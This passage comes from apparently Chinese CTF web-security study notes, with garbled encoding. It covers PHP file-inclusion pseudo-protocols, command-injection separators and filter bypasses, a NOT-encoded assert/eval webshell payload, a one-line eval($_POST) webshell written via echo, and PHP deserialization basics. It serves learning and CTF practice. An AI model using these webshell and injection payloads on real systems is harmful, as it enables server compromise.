<p><img src="https://img-blog.csdnimg.cn/1f9a0a4e11564da38bf19a9e83d3fb44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/1f9a0a4e11564da38bf19a9e83d3fb44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h5 id="5-phar-ä¼ªåè®®-è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹"><a href="#5-phar-ä¼ªåè®®-è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹" class="headerlink" title="5.phar://ä¼ªåè®®(è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹)"></a>5.phar://ä¼ªåè®®(è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹)</h5><p>   <strong>Â·æ¡ä»¶</strong></p>
<p><code>allow_url_fopen: off/on</code><br><code>allow_url_include: off/on (å‡ä¸å—å½±å“)</code></p>
<p><code>æ³¨</code>ï¼šphp ç‰ˆæœ¬å¤§äºç­‰äº<code>5.3.0</code>ï¼Œå‹ç¼©åŒ…éœ€è¦æ˜¯<code>zip</code>åè®®å‹ç¼©ï¼Œ<code>rar</code>ä¸è¡Œï¼Œå°†æœ¨é©¬æ–‡ä»¶å‹ç¼©åï¼Œæ”¹ä¸ºå…¶ä»–ä»»æ„æ ¼å¼çš„æ–‡ä»¶éƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚</p>
<p>  <strong>Â·æ ¼å¼</strong></p>
<p><code>?file=phar://å‹ç¼©åŒ…å/å†…éƒ¨æ–‡ä»¶å</code><br><code>ä¾‹ï¼šphar://x.zip/x.php</code></p>
<h5 id="6-zip-ä¼ªåè®®"><a href="#6-zip-ä¼ªåè®®" class="headerlink" title="6.zip://ä¼ªåè®®"></a>6.zip://ä¼ªåè®®</h5><p>zipä¼ªåè®®å’Œpharåè®®ç±»ä¼¼ï¼Œä½†æ˜¯ç”¨æ³•ä¸ä¸€æ ·ï¼ˆurlä¸åŒï¼‰</p>
<p>â€‹    <strong>Â·æ¡ä»¶</strong></p>
<p><code>allow_url_fopen: off/on</code><br><code>allow_url_include: off/on (å‡ä¸å—å½±å“)</code></p>
<p>   <strong>Â·æ ¼å¼</strong></p>
<p><code>?file=zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]</code>   </p>
<p><code>ä¾‹ï¼š zip://D:\phpstudy\WWW\x.zip%23shell.php       #-&gt;%23</code></p>
<h5 id="7-data-ä¼ªåè®®-è¯»å–æ–‡ä»¶"><a href="#7-data-ä¼ªåè®®-è¯»å–æ–‡ä»¶" class="headerlink" title="7.data://ä¼ªåè®®(è¯»å–æ–‡ä»¶)"></a>7.data://ä¼ªåè®®(è¯»å–æ–‡ä»¶)</h5><p>ï¼ˆå¯ä»¥ç›´æ¥è¾¾åˆ°æ‰§è¡Œphpä»£ç çš„æ•ˆæœï¼‰<br>å’Œ<code>php://input</code>å¾ˆåƒï¼Œ<code>php://input</code>ä»¥<code>post</code>æäº¤æ•°æ®é‚£æ ·æäº¤æ•°æ®ï¼Œ<br><code>data://</code>æ˜¯ä»¥<code>get</code>æ–¹å¼æäº¤æ•°æ®ï¼Œä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œæäº¤çš„è„šæœ¬</p>
<p>â€‹     <strong>Â·æ ¼å¼</strong></p>
<p><code>?file=data://text/plain,&lt;?php%20phpinfo()?&gt;</code></p>
<p>å¦‚æœå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯ä»¥é€šè¿‡base64ç¼–ç åå†è¾“å…¥</p>
<p><code>data://text/plain;base64,base64åŠ å¯†çš„ä»£ç </code></p>
<p>å¯é…åˆ<a href="https://www.cnblogs.com/xiaozi/p/7831529.html">phpå‘½ä»¤æ‰§è¡Œæ¼æ´</a>ï¼Œå®ç°å¯¹ä¸€äº›æ•°æ®çš„è·å–<br>å¦‚ï¼š<code>&lt;?php system(&quot;ls&quot;)?&gt;</code></p>
<h5 id="8-æ€»ç»“"><a href="#8-æ€»ç»“" class="headerlink" title="8.æ€»ç»“"></a>8.æ€»ç»“</h5><p><a href="https://blog.csdn.net/dreamthe/article/details/121765876">å‚è€ƒå®ä¾‹1</a></p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/106658417">å‚è€ƒå®ä¾‹2</a></p>
<hr>
<h3 id="å…«ã€é€»è¾‘æ¼æ´"><a href="#å…«ã€é€»è¾‘æ¼æ´" class="headerlink" title="å…«ã€é€»è¾‘æ¼æ´"></a>å…«ã€é€»è¾‘æ¼æ´</h3><hr>
<h3 id="ä¹ã€å‘½ä»¤æ‰§è¡Œ"><a href="#ä¹ã€å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ä¹ã€å‘½ä»¤æ‰§è¡Œ"></a>ä¹ã€å‘½ä»¤æ‰§è¡Œ</h3><h4 id="1-æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†ï¼ˆwindows-æˆ–-linux-ä¸‹ï¼‰"><a href="#1-æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†ï¼ˆwindows-æˆ–-linux-ä¸‹ï¼‰" class="headerlink" title="1.æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†ï¼ˆwindows æˆ– linux ä¸‹ï¼‰:"></a>1.æœ‰å…³å‘½ä»¤æ‰§è¡Œçš„çŸ¥è¯†ï¼ˆwindows æˆ– linux ä¸‹ï¼‰:</h4><p>1ï¼‰command1 ; command2 ç”¨;éš”å¼€è¡¨ç¤ºä¸ºå¤šä¸ªå‘½ä»¤ï¼Œå‘½ä»¤æŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰§è¡Œï¼Œå½¼æ­¤æ— å…³è”ï¼Œæ‰€æœ‰çš„å‘½ä»¤éƒ½ä¼šæ‰§è¡Œã€‚å…ˆæ‰§è¡Œ command1 åæ‰§è¡Œ command2</p>
<p>2ï¼‰command1 &amp;&amp; command2 å…ˆæ‰§è¡Œ command1ï¼Œå¦‚æœä¸ºçœŸï¼Œå†æ‰§è¡Œ command2</p>
<p>3ï¼‰command1 | command2 å°†ä¸¤ä¸ªå‘½ä»¤åˆ†å¼€ï¼Œå·¦è¾¹å‘½ä»¤çš„è¾“å‡ºä½œä¸ºå³è¾¹å‘½ä»¤çš„è¾“å…¥ï¼Œåªæ‰§è¡Œ command2</p>
<p>4ï¼‰command1 &amp; command2 &amp;è¡¨ç¤ºä»»åŠ¡åå°æ‰§è¡Œï¼Œä¸nohupå‘½ä»¤åŠŸèƒ½å·®ä¸å¤šï¼Œå…ˆæ‰§è¡Œ command2 åæ‰§è¡Œ command1</p>
<p>5ï¼‰command1 || command2 å…ˆæ‰§è¡Œ command1ï¼Œå¦‚æœä¸ºå‡ï¼Œå†æ‰§è¡Œ command2</p>
<p>å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆ| || &amp; &amp;&amp; ç§°ä¸º ç®¡é“ç¬¦ï¼‰</p>
<p>eg:</p>
<p>find  / -name â€œflag* â€œ<br>åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶åä¸­åŒ…å«flagçš„æ–‡ä»¶<br>find  / -name â€œ *.txtâ€<br>åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æŸ¥æ‰¾åç¼€ä¸ºtxtçš„æ–‡ä»¶</p>
<h4 id="ç»•è¿‡è¿‡æ»¤"><a href="#ç»•è¿‡è¿‡æ»¤" class="headerlink" title="ç»•è¿‡è¿‡æ»¤"></a>ç»•è¿‡è¿‡æ»¤</h4><h5 id="1-è¿‡æ»¤cat"><a href="#1-è¿‡æ»¤cat" class="headerlink" title="1.è¿‡æ»¤cat"></a>1.è¿‡æ»¤cat</h5><p><code>moreï¼Œlessï¼Œheadï¼Œtac</code>    éƒ½å¯ä»¥å¯¹æ–‡æœ¬è¿›è¡Œè¯»å–</p>
<h5 id="2-è¿‡æ»¤ç©ºæ ¼"><a href="#2-è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="2.è¿‡æ»¤ç©ºæ ¼"></a>2.è¿‡æ»¤ç©ºæ ¼</h5><p><code>IFS$9ã€%09ã€&lt;ã€&gt;ã€&lt;&gt;ã€&#123;,&#125;ã€%20ã€$&#123;IFS&#125;ã€$&#123;IFS&#125;</code>æ¥ä»£æ›¿ç©ºæ ¼</p>
<p><code>&lt;,&gt;</code>æ˜¯æŠŠå†…å®¹å¯¼å‘æŸä¸ªåœ°æ–¹ï¼Œå¯ä»¥æ˜¯æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯å‘½ä»¤</p>
<p>å¦‚<code>cat&lt;flag.php</code>å°±æ˜¯ç›¸å½“äºï¼ŒæŠŠflag.phpå†…å®¹ç”¨catå‘½ä»¤æ˜¾ç¤ºå‡ºæ¥</p>
<p><code>%09</code>æ˜¯tabé”®ï¼Œå¯ä»¥è¡¥å…¨å†…å®¹</p>
<p>æ¯”å¦‚è¿‡æ»¤äº†flagï¼Œä½†æ˜¯éœ€è¦è®¿é—®flag233.php</p>
<p>é‚£ä¹ˆå°±å¯ä»¥<code>cat %09*233.php</code>ï¼Œå°±å¯ä»¥äº†</p>
<h5 id="3-è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦"><a href="#3-è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦" class="headerlink" title="3.è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦"></a>3.è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦</h5><p>ä¹Ÿå°±æ˜¯/ä¸èƒ½ç”¨äº†ï¼Œä¸èƒ½ç›´æ¥æŸ¥çœ‹æ–‡ä»¶ç›®å½•</p>
<p><code>cat /flag_is_here/flag_9012297169124.php</code></p>
<p>å¯ä»¥<strong>åˆ©ç”¨åˆ†å·ä½¿ä¸¤ä¸ªå‘½ä»¤åŒæ—¶è¿›è¡Œ</strong>ä¹Ÿå°±æ˜¯</p>
<p><code>127.0.0.1;cd flag_is_here;cat flag_9012297169124.php</code></p>
<h5 id="4-è¿‡æ»¤è¿ç®—ç¬¦"><a href="#4-è¿‡æ»¤è¿ç®—ç¬¦" class="headerlink" title="4.è¿‡æ»¤è¿ç®—ç¬¦"></a>4.è¿‡æ»¤è¿ç®—ç¬¦</h5><p>å¯ä»¥ç”¨;ä»£æ›¿ç®¡é“è¿ç®—ç¬¦</p>
<h5 id="5-ç»•è¿‡æ­£åˆ™åŒ¹é…"><a href="#5-ç»•è¿‡æ­£åˆ™åŒ¹é…" class="headerlink" title="5.ç»•è¿‡æ­£åˆ™åŒ¹é…"></a>5.ç»•è¿‡æ­£åˆ™åŒ¹é…</h5><p>æ¯”å¦‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>)</span></span>)</span><br></pre></td></tr></table></figure></div>

<p>æ‰€æœ‰å¤§å°å†™å­—æ¯å’Œæ•°å­—éƒ½è¢«æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†</p>
<p>è¿™é‡Œå°±éœ€è¦</p>
<p>æ³•ä¸€ï¼šå–åç»•è¿‡ï¼š</p>
<p><u><strong>å–å</strong>å°±æ˜¯å°†æ•°å­—è½¬åŒ–ä¸ºäºŒè¿›åˆ¶,å†æŠŠäºŒè¿›åˆ¶ä¸­çš„1å˜æˆ0,0å˜æˆ1</u></p>
<p><code>~</code>æ˜¯å–åç¬¦å·ï¼Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">ç»“æœï¼š</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br><span class="line"></span><br><span class="line"><span class="comment">//phpæ–­è¨€ï¼šassert â€” æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º falseï¼Œå¦‚æœå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå†èµ‹å€¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XQUERY"><figure class="iseeu highlight /xquery"><table><tr><td class="code"><pre><span class="line">?code=(~<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>)(~<span class="meta">%9A</span><span class="meta">%89</span><span class="meta">%9E</span><span class="meta">%93</span><span class="meta">%D7</span><span class="meta">%DB</span><span class="meta">%A0</span><span class="meta">%AD</span><span class="meta">%BA</span><span class="meta">%AE</span><span class="meta">%AA</span><span class="meta">%BA</span><span class="meta">%AC</span><span class="meta">%AB</span><span class="meta">%A4</span><span class="meta">%C7</span><span class="meta">%A2</span><span class="meta">%D6</span>);</span><br><span class="line"></span><br><span class="line">//æ³¨æ„åé¢è¦æœ‰ï¼›ï¼Œä»£è¡¨phpä»£ç ç»“æŸ</span><br><span class="line">//è¿™é‡Œ~æ˜¯å–åï¼Œä¹‹å‰urlencodeé‡Œå–åäº†ä¸€æ¬¡ï¼Œèµ‹å€¼æ—¶å†å–åä¸€æ¬¡ï¼Œç›¸å½“äºæ²¡æœ‰å–å</span><br><span class="line">ç­‰åŒäº</span><br><span class="line">?code=(assert)(eval(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])),(assert)å› ä¸ºæ˜¯assertæ˜¯å‡½æ•°ï¼Œè¢«å½“ä½œå‡½æ•°æ‰§è¡Œï¼Œäºæ˜¯å› ä¸ºæ–­è¨€(eval(<span class="variable">$_REQUEST</span>[<span class="number">8</span>]))ï¼Œæ‰€ä»¥æŠŠeval(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])å½“ä½œphpæ‰§è¡Œï¼Œäºæ˜¯å°±å¯ä»¥æ‹¿åˆ°shelläº†</span><br><span class="line"></span><br><span class="line">èšå‰‘è¿æ¥</span><br><span class="line">http://url?code=(~<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>)(~<span class="meta">%9A</span><span class="meta">%89</span><span class="meta">%9E</span><span class="meta">%93</span><span class="meta">%D7</span><span class="meta">%DB</span><span class="meta">%A0</span><span class="meta">%AD</span><span class="meta">%BA</span><span class="meta">%AE</span><span class="meta">%AA</span><span class="meta">%BA</span><span class="meta">%AC</span><span class="meta">%AB</span><span class="meta">%A4</span><span class="meta">%C7</span><span class="meta">%A2</span><span class="meta">%D6</span>);</span><br></pre></td></tr></table></figure></div>





<p>æ³•2ï¼šå¼‚æˆ–ç»•è¿‡:</p>
<p>åœ¨PHPä¸­ä¸¤ä¸ªå­—ç¬¦ä¸²å¼‚æˆ–ä¹‹åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚<br> ä¾‹å¦‚ï¼šå¼‚æˆ– <code>?</code> å’Œ <code>~</code> ä¹‹åå¾—åˆ°çš„æ˜¯ <code>A</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">å­—ç¬¦ï¼š?         ASCIIç ï¼š63           äºŒè¿›åˆ¶ï¼š  00â€­11 1111â€¬</span><br><span class="line">å­—ç¬¦ï¼š~         ASCIIç ï¼š126          äºŒè¿›åˆ¶ï¼š <span class="number"> 0111 </span>1110â€¬</span><br><span class="line">å¼‚æˆ–è§„åˆ™ï¼š</span><br><span class="line">1   XOR  <span class="number"> 0 </span>  =   1</span><br><span class="line">0   XOR  <span class="number"> 1 </span>  =   1</span><br><span class="line">0   XOR  <span class="number"> 0 </span>  =   0</span><br><span class="line">1   XOR  <span class="number"> 1 </span>  =   0</span><br><span class="line">ä¸Šè¿°ä¸¤ä¸ªå­—ç¬¦å¼‚æˆ–å¾—åˆ° äºŒè¿›åˆ¶ï¼š <span class="number"> 0100 </span>0001</span><br><span class="line">è¯¥äºŒè¿›åˆ¶çš„åè¿›åˆ¶ä¹Ÿå°±æ˜¯ï¼š65</span><br><span class="line">å¯¹åº”çš„ASCIIç æ˜¯ï¼šA</span><br></pre></td></tr></table></figure></div>

<p>æœ¬é¢˜preg_replace()è¿‡æ»¤äº†<code>æ‰€æœ‰è‹±æ–‡å­—æ¯å’Œæ•°å­—</code>ï¼Œä½†æ˜¯<em>ASCIIç ä¸­è¿˜æœ‰å¾ˆå¤š<code>å­—æ¯æ•°å­—ä¹‹å¤–çš„å­—ç¬¦</code>ï¼Œåˆ©ç”¨è¿™äº›å­—ç¬¦è¿›è¡Œå¼‚æˆ–å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦</em></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COS"><figure class="iseeu highlight /cos"><table><tr><td class="code"><pre><span class="line">PSï¼šå–<span class="keyword">ASCII</span>è¡¨ç§éå­—æ¯æ•°å­—çš„å…¶ä»–å­—ç¬¦ï¼Œè¦æ³¨æ„æœ‰äº›å­—ç¬¦å¯èƒ½ä¼šå½±å“æ•´ä¸ªè¯­å¥æ‰§è¡Œï¼Œæ‰€ä»¥è¦å»æ‰å¦‚ï¼šåå¼•å·ï¼Œå•å¼•å·</span><br></pre></td></tr></table></figure></div>

<h5 id="6-ç»•è¿‡é•¿åº¦é™åˆ¶"><a href="#6-ç»•è¿‡é•¿åº¦é™åˆ¶" class="headerlink" title="6.ç»•è¿‡é•¿åº¦é™åˆ¶"></a>6.ç»•è¿‡é•¿åº¦é™åˆ¶</h5><p><code>&gt;</code>å’Œ<code>&gt;&gt;</code>ä¸¤ä¸ªç¬¦å·çš„ä½¿ç”¨</p>
<p>ä½¿ç”¨<code>&gt;</code>å‘½ä»¤ä¼šå°†åŸæœ‰æ–‡ä»¶å†…å®¹è¦†ç›–ï¼Œå¦‚æœæ˜¯å­˜å…¥ä¸å­˜åœ¨çš„æ–‡ä»¶åï¼Œé‚£ä¹ˆå°±ä¼šæ–°å»ºæ–‡ä»¶å†å­˜å…¥</p>
<p><img src="/2022/05/28/Web-study/image-20220926223728694.png" alt="image-20220926223728694"></p>
<p><code>&gt;&gt;</code>ç¬¦å·çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸå†…å®¹</p>
<p><img src="/2022/05/28/Web-study/image-20220926223749908.png" alt="image-20220926223749908"></p>
<h4 id="2-å¸¸ç”¨å‘½ä»¤"><a href="#2-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="2.å¸¸ç”¨å‘½ä»¤"></a>2.å¸¸ç”¨å‘½ä»¤</h4><p>ls</p>
<p>cat</p>
<p>touchã€åˆ›å»ºæ–‡ä»¶ï¼Œä¸€èˆ¬åˆ›å»ºè„šæœ¬æ–‡ä»¶ï¼Œ</p>
<p>æ¯”å¦‚<code>touch haha.php</code></p>
<p>ç„¶åå†æ‰§è¡Œ<code>echo &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot;&gt;&gt;haha.php</code>ï¼Œåœ¨è„šæœ¬æ–‡ä»¶é‡Œå†™ä¸€ä¸²ä¸€å¥è¯æœ¨é©¬</p>
<p><strong>ä½†æ˜¯æ³¨æ„å› ä¸ºæœ‰$ï¼Œåé¢çš„çœ‹å¯èƒ½ä¼šè¢«å½“åšå˜é‡ï¼Œæ‰€ä»¥å¯ä»¥åŠ ä¸Šåæ–œæ \è½¬ä¹‰</strong></p>
<p><code>echo &quot;&lt;?php @eval(\$_POST[&#39;cmd&#39;]);?&gt;&quot;&gt;&gt;haha.php</code></p>
<p>ã€‘</p>
<hr>
<h3 id="åã€æš´åŠ›ç ´è§£"><a href="#åã€æš´åŠ›ç ´è§£" class="headerlink" title="åã€æš´åŠ›ç ´è§£"></a>åã€æš´åŠ›ç ´è§£</h3><p>ä¸€æŠŠæœå“ˆå°±å®Œäº‹ï¼ˆå¥¸ç¬‘ï¼‰</p>
<hr>
<h3 id="åä¸€ã€ååºåˆ—åŒ–"><a href="#åä¸€ã€ååºåˆ—åŒ–" class="headerlink" title="åä¸€ã€ååºåˆ—åŒ–"></a>åä¸€ã€ååºåˆ—åŒ–</h3><p><a href="https://blog.csdn.net/Onlyone_1314/article/details/121461984?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&utm_relevant_index=2">åŸæ–‡é“¾æ¥1</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/377676274">åŸæ–‡é“¾æ¥2</a></p>
<h4 id="åºåˆ—åŒ–ï¼š"><a href="#åºåˆ—åŒ–ï¼š" class="headerlink" title="åºåˆ—åŒ–ï¼š"></a>åºåˆ—åŒ–ï¼š</h4><p>â€ƒâ€ƒ<strong>åºåˆ—åŒ–</strong>(Serialization)æ˜¯å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼çš„è¿‡ç¨‹ã€‚åœ¨åºåˆ—åŒ–æœŸé—´ï¼Œå¯¹è±¡å°†å…¶å½“å‰çŠ¶æ€å†™å…¥åˆ°ä¸´æ—¶æˆ–æŒä¹…æ€§å­˜å‚¨åŒºã€‚ä»¥åï¼Œå¯ä»¥é€šè¿‡ä»å­˜å‚¨åŒºä¸­è¯»å–æˆ–ååºåˆ—åŒ–å¯¹è±¡çš„çŠ¶æ€ï¼Œé‡æ–°åˆ›å»ºè¯¥å¯¹è±¡ã€‚</p>
<h4 id="phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h4><p>æ¦‚å¿µï¼š<code>phpçš„åºåˆ—åŒ–å°†å¯¹è±¡è½¬åŒ–ä¸ºäº†å­—ç¬¦ä¸²ï¼ŒåŒ…å«äº†å¯¹è±¡çš„æ‰€æœ‰æ•°æ®ä¿¡æ¯ï¼Œ</code><br><code>ååºåˆ—åŒ–æ—¶å†æ ¹æ®è¿™äº›ä¿¡æ¯è¿˜åŸå¯¹è±¡ã€‚</code></p>
<p>â€ƒâ€ƒ<u>phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç”±serialize()å’Œunserialize()</u>è¿™ä¸¤ä¸ªå‡½æ•°æ¥å®Œæˆã€‚serialize()å®Œæˆåºåˆ—åŒ–çš„æ“ä½œï¼Œå°†ä¼ å…¥çš„å€¼è½¬æ¢ä¸ºåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼›è€Œunserialize()å®Œæˆååºåˆ—åŒ–çš„æ“ä½œï¼Œå°†å­—ç¬¦ä¸²è½¬æ¢æˆåŸæ¥çš„å˜é‡ã€‚</p>
<p><code>serialize(mixed $value): string</code><br>        serialize()è¿”å›å­—ç¬¦ä¸²ï¼Œæ­¤å­—ç¬¦ä¸²åŒ…å«äº†è¡¨ç¤º value çš„å­—èŠ‚æµï¼Œå¯ä»¥å­˜å‚¨äºä»»ä½•åœ°æ–¹ï¼š</p>
<p><code>O::&quot;&quot;::&#123;&lt;field name 1&gt;&lt;field value 1&gt;â€¦&#125;</code><br><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>â€ƒâ€ƒå½“åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼ŒPHP å°†è¯•å›¾åœ¨åºåˆ—åŠ¨ä½œä¹‹å‰è°ƒç”¨è¯¥å¯¹è±¡çš„æˆå‘˜å‡½æ•° sleep()ã€‚è¿™æ ·å°±å…è®¸å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰åšä»»ä½•æ¸…é™¤æ“ä½œã€‚ç±»ä¼¼çš„ï¼Œå½“ä½¿ç”¨ unserialize() æ¢å¤å¯¹è±¡æ—¶ï¼Œ å°†è°ƒç”¨ wakeup() æˆå‘˜å‡½æ•°ã€‚<br><code>unserialize(string $str): mixed</code><br>â€ƒâ€ƒunserialize()å¯¹å•ä¸€çš„å·²åºåˆ—åŒ–çš„å˜é‡è¿›è¡Œæ“ä½œï¼Œå°†å…¶è½¬æ¢å› PHP çš„å€¼ã€‚<br>è‹¥è¢«ååºåˆ—åŒ–çš„å˜é‡æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨æˆåŠŸåœ°é‡æ–°æ„é€ å¯¹è±¡ä¹‹åï¼ŒPHP ä¼šè‡ªåŠ¨åœ°è¯•å›¾å»è°ƒç”¨ wakeup() æˆå‘˜å‡½æ•°ï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰ã€‚</p>
<p>æ³¨æ„ï¼š</p>
<p>privateå£°æ˜</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HAML"><figure class="iseeu highlight /haml"><table><tr><td class="code"><pre><span class="line">private å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚</span><br><span class="line"></span><br><span class="line">å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š0çš„å‰ç¼€ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦</span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">%<span class="selector-tag">00</span></span>ä¹Ÿå°±æ˜¯ç©ºå­—ç¬¦ï¼Œæ— æ³•å¤åˆ¶ï¼Œåªèƒ½è‡ªå·±ä¿®æ”¹äºŒè¿›åˆ¶ï¼Œæˆ–è€…è‡ªå·±åŠ ä¸Š</span><br></pre></td></tr></table></figure></div>



<h4 id="phpé­”æœ¯æ–¹æ³•"><a href="#phpé­”æœ¯æ–¹æ³•" class="headerlink" title="phpé­”æœ¯æ–¹æ³•"></a>phpé­”æœ¯æ–¹æ³•</h4><p><a href="https://blog.csdn.net/qq_45552960/article/details/102664372">åŸæ–‡é“¾æ¥</a></p>
<p>â€ƒâ€ƒPHPä¸­ä»¥ä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å¤´çš„æ–¹æ³•ï¼Œ<code>__construct(),__destruct(),__call(),__callStatic(),__get(),__set(),__isset(),__unset(),__sleep(),__wakeup(),__toString(),__set_state(),__clone()ï¼Œ__autoload()</code>ç­‰ï¼Œè¢«ç§°ä¸ºâ€é­”æœ¯æ–¹æ³•â€ï¼ˆMagic methodsï¼‰ã€‚è¿™äº›æ–¹æ³•åœ¨ä¸€å®šæ¡ä»¶ä¸‹æœ‰ç‰¹æ®Šçš„åŠŸèƒ½ï¼Œåœ¨å‘½åè‡ªå·±çš„ç±»æ–¹æ³•æ—¶ä¸èƒ½ä½¿ç”¨è¿™äº›æ–¹æ³•åï¼Œé™¤éæ˜¯æƒ³ä½¿ç”¨å…¶é­”æœ¯åŠŸèƒ½</p>
<p>ä¸åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„é­”æœ¯æ–¹æ³•ä¸»è¦æ˜¯ï¼š</p>
